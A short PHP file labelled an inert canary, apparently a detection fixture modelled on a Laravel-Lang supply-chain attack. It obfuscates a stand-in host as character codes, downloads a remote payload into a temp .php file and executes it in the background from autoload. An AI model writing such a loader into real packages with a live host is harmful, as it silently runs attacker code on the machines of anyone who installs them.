<?php
// INERT CANARY modelled on the 2026 Laravel-Lang tag rewrite: host hidden as char codes,
// payload fetched into a temp .php and run in the background from autoload.files
(function () {
    $dir = sys_get_temp_dir() . '/.canary';
    $h = implode('', array_map('chr', [101,120,97,109,112,108,101,46,105,110,118,97,108,105,100]));
    $d = @file_get_contents("https://{$h}/payload", false, stream_context_create([]));
    if ($d) {
        $f = $dir . '/x.php';
        if (@file_put_contents($f, $d) !== false) {
            @exec("php \"$f\" > /dev/null 2>&1 &");
        }
    }
})();
